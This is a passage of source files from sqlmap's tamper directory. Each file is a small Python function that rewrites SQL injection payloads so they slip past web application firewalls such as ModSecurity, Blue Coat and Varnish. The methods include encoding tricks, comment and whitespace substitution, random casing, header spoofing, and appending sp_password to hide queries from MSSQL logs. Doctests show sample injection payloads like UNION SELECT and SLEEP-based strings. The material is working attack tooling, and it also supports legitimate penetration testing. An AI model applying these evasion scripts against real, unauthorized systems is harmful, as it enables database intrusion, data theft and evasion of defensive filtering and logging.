'1--%0AAND--%0A9227=9227'\n    \"\"\"\n\n    retVal = \"\"\n\n    if payload:\n        for i in xrange(len(payload)):\n            if payload[i].isspace():\n                retVal += \"--%0A\"\n            elif payload[i] == '#' or payload[i:i + 3] == '-- ':\n                retVal += payload[i:]\n                break\n            else:\n                retVal += payload[i]\n\n    return retVal\n", "tamper/schemasplit.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Splits FROM schema identifiers (e.g. 'testdb.users') with whitespace (e.g. 'testdb 9.e.users')\n\n    Requirement:\n        * MySQL\n\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf\n\n    >>> tamper('SELECT id FROM testdb.users')\n    'SELECT id FROM testdb 9.e.users'\n    \"\"\"\n\n    return re.sub(r\"(?i)( FROM \\w+)\\.(\\w+)\", r\"\\g<1> 9.e.\\g<2>\", payload) if payload else payload\n", "tamper/symboliclogical.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)\n\n    >>> tamper(\"1 AND '1'='1\")\n    \"1 %26%26 '1'='1\"\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?i)\\bAND\\b\", \"%26%26\", re.sub(r\"(?i)\\bOR\\b\", \"%7C%7C\", payload))\n\n    return retVal\n", "tamper/decentities.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode in decimal (using code points) all characters (e.g. ' -> &#39;)\n\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '&#49;&#39;&#32;&#65;&#78;&#68;&#32;&#83;&#76;&#69;&#69;&#80;&#40;&#53;&#41;&#35;'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        i = 0\n\n        while i < len(payload):\n            retVal += \"&#%s;\" % ord(payload[i])\n            i += 1\n\n    return retVal\n", "tamper/apostrophemask.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)\n\n    References:\n        * http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128\n        * https://web.archive.org/web/20130614183121/http://lukasz.pilorz.net/testy/unicode_conversion/\n        * https://web.archive.org/web/20131121094431/sla.ckers.org/forum/read.php?13,11562,11850\n        * https://web.archive.org/web/20070624194958/http://lukasz.pilorz.net/testy/full_width_utf/index.phps\n\n    >>> tamper(\"1 AND '1'='1\")\n    '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'\n    \"\"\"\n\n    return payload.replace('\\'', \"%EF%BC%87\") if payload else payload\n", "tamper/if2case.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'doc/COPYING' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nfrom lib.core.settings import REPLACEMENT_MARKER\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'IF(A, B, C)' with 'CASE WHEN (A) THEN (B) ELSE (C) END' counterpart\n\n    Requirement:\n        * MySQL\n        * SQLite (possibly)\n        * SAP MaxDB (possibly)\n\n    Tested against:\n        * MySQL 5.0 and 5.5\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that filter the IF() functions\n\n    >>> tamper('IF(1, 2, 3)')\n    'CASE WHEN (1) THEN (2) ELSE (3) END'\n    >>> tamper('SELECT IF((1=1), (SELECT \"foo\"), NULL)')\n    'SELECT CASE WHEN (1=1) THEN (SELECT \"foo\") ELSE (NULL) END'\n    \"\"\"\n\n    if payload and payload.find(\"IF\") > -1:\n        payload = payload.replace(\"()\", REPLACEMENT_MARKER)\n        while payload.find(\"IF(\") > -1:\n            index = payload.find(\"IF(\")\n            depth = 1\n            commas, end = [], None\n\n            for i in xrange(index + len(\"IF(\"), len(payload)):\n                if depth == 1 and payload[i] == ',':\n                    commas.append(i)\n\n                elif depth == 1 and payload[i] == ')':\n                    end = i\n                    break\n\n                elif payload[i] == '(':\n                    depth += 1\n\n                elif payload[i] == ')':\n                    depth -= 1\n\n            if len(commas) == 2 and end:\n                a = payload[index + len(\"IF(\"):commas[0]].strip(\"()\")\n                b = payload[commas[0] + 1:commas[1]].lstrip().strip(\"()\")\n                c = payload[commas[1] + 1:end].lstrip().strip(\"()\")\n                newVal = \"CASE WHEN (%s) THEN (%s) ELSE (%s) END\" % (a, b, c)\n                payload = payload[:index] + newVal + payload[end + 1:]\n            else:\n                break\n\n        payload = payload.replace(REPLACEMENT_MARKER, \"()\")\n\n    return payload\n", "tamper/concat2concatws.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 5.0\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that filter the CONCAT() function\n\n    >>> tamper('CONCAT(1,2)')\n    'CONCAT_WS(MID(CHAR(0),0,0),1,2)'\n    \"\"\"\n\n    if payload:\n        payload = payload.replace(\"CONCAT(\", \"CONCAT_WS(MID(CHAR(0),0,0),\")\n\n    return payload\n", "tamper/space2randomblank.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport random\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a random blank character from a valid set of alternate characters\n\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n\n    Notes:\n        * Useful to bypass several web application firewalls\n\n    >>> random.seed(0)\n    >>> tamper('SELECT id FROM users')\n    'SELECT%0Did%0CFROM%0Ausers'\n    \"\"\"\n\n    # ASCII table:\n    #   TAB     09      horizontal TAB\n    #   LF      0A      new line\n    #   FF      0C      new page\n    #   CR      0D      carriage return\n    blanks = (\"%09\", \"%0A\", \"%0C\", \"%0D\")\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += random.choice(blanks)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == ' ' and not doublequote and not quote:\n                retVal += random.choice(blanks)\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n", "tamper/plus2concat.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import zeroDepthSearch\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MSSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart\n\n    Tested against:\n        * Microsoft SQL Server 2012\n\n    Requirements:\n        * Microsoft SQL Server 2012+\n\n    Notes:\n        * Useful in case ('+') character is filtered\n\n    >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')\n    'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'\n\n    >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')\n    '1 UNION ALL SELECT NULL,NULL,CONCAT(CHAR(113),CHAR(118),CHAR(112),CHAR(112),CHAR(113),ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),CHAR(113),CHAR(112),CHAR(107),CHAR(112),CHAR(113))-- qtfe'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        match = re.search(r\"('[^']+'|CHAR\\(\\d+\\))\\+.*(?<=\\+)('[^']+'|CHAR\\(\\d+\\))\", retVal)\n        if match:\n            part = match.group(0)\n\n            chars = [char for char in part]\n            for index in zeroDepthSearch(part, '+'):\n                chars[index] = ','\n\n            replacement = \"CONCAT(%s)\" % \"\".join(chars)\n            retVal = retVal.replace(part, replacement)\n\n    return retVal\n", "tamper/ifnull2ifisnull.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart\n\n    Requirement:\n        * MySQL\n        * SQLite (possibly)\n        * SAP MaxDB (possibly)\n\n    Tested against:\n        * MySQL 5.0 and 5.5\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that filter the IFNULL() function\n\n    >>> tamper('IFNULL(1, 2)')\n    'IF(ISNULL(1),2,1)'\n    \"\"\"\n\n    if payload and payload.find(\"IFNULL\") > -1:\n        while payload.find(\"IFNULL(\") > -1:\n            index = payload.find(\"IFNULL(\")\n            depth = 1\n            comma, end = None, None\n\n            for i in xrange(index + len(\"IFNULL(\"), len(payload)):\n                if depth == 1 and payload[i] == ',':\n                    comma = i\n\n                elif depth == 1 and payload[i] == ')':\n                    end = i\n                    break\n\n                elif payload[i] == '(':\n                    depth += 1\n\n                elif payload[i] == ')':\n                    depth -= 1\n\n            if comma and end:\n                _ = payload[index + len(\"IFNULL(\"):comma]\n                __ = payload[comma + 1:end].lstrip()\n                newVal = \"IF(ISNULL(%s),%s,%s)\" % (_, __, _)\n                payload = payload[:index] + newVal + payload[end + 1:]\n            else:\n                break\n\n    return payload\n", "tamper/bluecoat.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.data import kb\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE\n\n    Requirement:\n        * Blue Coat SGOS with WAF activated as documented in\n        https://kb.bluecoat.com/index?page=content&id=FAQ2147\n\n    Tested against:\n        * MySQL 5.1, SGOS\n\n    Notes:\n        * Useful to bypass Blue Coat's recommended WAF rule configuration\n\n    >>> tamper('SELECT id FROM users WHERE id = 1')\n    'SELECT%09id FROM%09users WHERE%09id LIKE 1'\n    \"\"\"\n\n    def process(match):\n        word = match.group('word')\n        if word.upper() in kb.keywords:\n            return match.group().replace(word, \"%s%%09\" % word)\n        else:\n            return match.group()\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"\\b(?P<word>[A-Z_]+)(?=[^\\w(]|\\Z)\", process, retVal)\n        retVal = re.sub(r\"\\s*=\\s*\", \" LIKE \", retVal)\n        retVal = retVal.replace(\"%09 \", \"%09\")\n\n    return retVal\n", "tamper/hexentities.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode in hexadecimal (using code points) all characters (e.g. ' -> &#x31;)\n\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '&#x31;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x4c;&#x45;&#x45;&#x50;&#x28;&#x35;&#x29;&#x23;'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        i = 0\n\n        while i < len(payload):\n            retVal += \"&#x%s;\" % format(ord(payload[i]), \"x\")\n            i += 1\n\n    return retVal\n", "tamper/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "tamper/commentbeforeparentheses.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Prepends (inline) comment before parentheses (e.g. ( -> /**/()\n\n    Tested against:\n        * Microsoft SQL Server\n        * MySQL\n        * Oracle\n        * PostgreSQL\n\n    Notes:\n        * Useful to bypass web application firewalls that block usage\n          of function calls\n\n    >>> tamper('SELECT ABS(1)')\n    'SELECT ABS/**/(1)'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"\\b(\\w+)\\(\", r\"\\g<1>/**/(\", retVal)\n\n    return retVal\n", "tamper/sp_password.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGH\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs\n\n    Requirement:\n        * MSSQL\n\n    Notes:\n        * Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure\n        * Reference: http://websec.ca/kb/sql_injection\n\n    >>> tamper('1 AND 9227=9227-- ')\n    '1 AND 9227=9227-- sp_password'\n    \"\"\"\n\n    retVal = \"\"\n\n    if payload:\n        retVal = \"%s%ssp_password\" % (payload, \"-- \" if not any(_ if _ in payload else None for _ in ('#', \"-- \")) else \"\")\n\n    return retVal\n", "tamper/charencode.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport string\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)\n\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n\n    Notes:\n        * Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset\n        * The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS\n\n    >>> tamper('SELECT FIELD FROM%20TABLE')\n    '%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        i = 0\n\n        while i < len(payload):\n            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:\n                retVal += payload[i:i + 3]\n                i += 3\n            else:\n                retVal += '%%%.2X' % ord(payload[i])\n                i += 1\n\n    return retVal\n", "tamper/space2comment.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with comments '/**/'\n\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n\n    >>> tamper('SELECT id FROM users')\n    'SELECT/**/id/**/FROM/**/users'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += \"/**/\"\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += \"/**/\"\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n", "tamper/lowercase.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.data import kb\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with lower case value (e.g. SELECT -> select)\n\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that has poorly written permissive regular expressions\n\n    >>> tamper('INSERT')\n    'insert'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        for match in re.finditer(r\"\\b[A-Za-z_]+\\b\", retVal):\n            word = match.group()\n\n            if word.upper() in kb.keywords:\n                retVal = retVal.replace(word, word.lower())\n\n    return retVal\n", "tamper/randomcomments.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import randomRange\nfrom lib.core.compat import xrange\nfrom lib.core.data import kb\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)\n\n    >>> import random\n    >>> random.seed(0)\n    >>> tamper('INSERT')\n    'I/**/NS/**/ERT'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        for match in re.finditer(r\"\\b[A-Za-z_]+\\b\", payload):\n            word = match.group()\n\n            if len(word) < 2:\n                continue\n\n            if word.upper() in kb.keywords:\n                _ = word[0]\n\n                for i in xrange(1, len(word) - 1):\n                    _ += \"%s%s\" % (\"/**/\" if randomRange(0, 1) else \"\", word[i])\n\n                _ += word[-1]\n\n                if \"/**/\" not in _:\n                    index = randomRange(1, len(word) - 1)\n                    _ = word[:index] + \"/**/\" + word[index:]\n\n                retVal = retVal.replace(word, _)\n\n    return retVal\n", "tamper/modsecurityversioned.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import randomInt\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGHER\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Embraces complete query with (MySQL) versioned comment\n\n    Requirement:\n        * MySQL\n\n    Tested against:\n        * MySQL 5.0\n\n    Notes:\n        * Useful to bypass ModSecurity WAF\n\n    >>> import random\n    >>> random.seed(0)\n    >>> tamper('1 AND 2>1--')\n    '1 /*!30963AND 2>1*/--'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        postfix = ''\n        for comment in ('#', '--', '/*'):\n            if comment in payload:\n                postfix = payload[payload.find(comment):]\n                payload = payload[:payload.find(comment)]\n                break\n        if ' ' in payload:\n            retVal = \"%s /*!30%s%s*/%s\" % (payload[:payload.find(' ')], randomInt(3), payload[payload.find(' ') + 1:], postfix)\n\n    return retVal\n", "tamper/charunicodeescape.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport string\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054)\n\n    Notes:\n        * Useful to bypass weak filtering and/or WAFs in JSON contexes\n\n    >>> tamper('SELECT FIELD FROM TABLE')\n    '\\\\\\\\u0053\\\\\\\\u0045\\\\\\\\u004C\\\\\\\\u0045\\\\\\\\u0043\\\\\\\\u0054\\\\\\\\u0020\\\\\\\\u0046\\\\\\\\u0049\\\\\\\\u0045\\\\\\\\u004C\\\\\\\\u0044\\\\\\\\u0020\\\\\\\\u0046\\\\\\\\u0052\\\\\\\\u004F\\\\\\\\u004D\\\\\\\\u0020\\\\\\\\u0054\\\\\\\\u0041\\\\\\\\u0042\\\\\\\\u004C\\\\\\\\u0045'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        i = 0\n\n        while i < len(payload):\n            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:\n                retVal += \"\\\\u00%s\" % payload[i + 1:i + 3]\n                i += 3\n            else:\n                retVal += '\\\\u%.4X' % ord(payload[i])\n                i += 1\n\n    return retVal\n", "tamper/randomcase.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import randomRange\nfrom lib.core.compat import xrange\nfrom lib.core.data import kb\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)\n\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n        * SQLite 3\n\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that has poorly written permissive regular expressions\n        * This tamper script should work against all (?) databases\n\n    >>> import random\n    >>> random.seed(0)\n    >>> tamper('INSERT')\n    'InSeRt'\n    >>> tamper('f()')\n    'f()'\n    >>> tamper('function()')\n    'FuNcTiOn()'\n    >>> tamper('SELECT id FROM `user`')\n    'SeLeCt id FrOm `user`'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        for match in re.finditer(r\"\\b[A-Za-z_]{2,}\\b\", retVal):\n            word = match.group()\n\n            if (word.upper() in kb.keywords and re.search(r\"(?i)[`\\\"'\\[]%s[`\\\"'\\]]\" % word, retVal) is None) or (\"%s(\" % word) in payload:\n                while True:\n                    _ = \"\"\n\n                    for i in xrange(len(word)):\n                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()\n\n                    if len(_) > 1 and _ not in (_.lower(), _.upper()):\n                        break\n\n                retVal = retVal.replace(word, _)\n\n    return retVal\n", "tamper/varnish.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall\n\n    Reference:\n        * https://web.archive.org/web/20160815052159/http://community.hpe.com/t5/Protect-Your-Assets/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366\n\n    Notes:\n        Examples:\n        >> X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)\n        >> X-remote-IP: TARGET_PROXY_IP (184.189.250.X)\n        >> X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)\n        >> x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)\n        >> X-remote-IP: * or %00 or %0A\n    \"\"\"\n\n    headers = kwargs.get(\"headers\", {})\n    headers[\"X-originating-IP\"] = \"127.0.0.1\"\n    return payload\n", "tamper/space2mssqlhash.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n')\n\n    Requirement:\n        * MSSQL\n        * MySQL\n\n    Notes:\n        * Useful to bypass several web application firewalls\n\n    >>> tamper('1 AND 9227=9227')\n    '1%23%0AAND%23%0A9227=9227'\n    \"\"\"\n\n    retVal = \"\"\n\n    if payload:\n        for i in xrange(len(payload)):\n            if payload[i].isspace():\n                retVal += \"%23%0A\"\n            elif payload[i] == '#' or payload[i:i + 3] == '-- ':\n                retVal += payload[i:]\n                break\n            else:\n                retVal += payload[i]\n\n    return retVal\n", "tamper/percentage.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\nimport string\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against ASP web applications\" % os.path.basename(__file__).split(\".\")[0])\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)\n\n    Requirement:\n        * ASP\n\n    Tested against:\n        * Microsoft SQL Server 2000, 2005\n        * MySQL 5.1.56, 5.5.11\n        * PostgreSQL 9.0\n\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n\n    >>> tamper('SELECT FIELD FROM TABLE')\n    '%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'\n    \"\"\"\n\n    if payload:\n        retVal = \"\"\n        i = 0\n\n        while i < len(payload):\n            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:\n                retVal += payload[i:i + 3]\n                i += 3\n            elif payload[i] != ' ':\n                retVal += '%%%s' % payload[i]\n                i += 1\n            else:\n                retVal += payload[i]\n                i += 1\n\n    return retVal\n", "extra/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 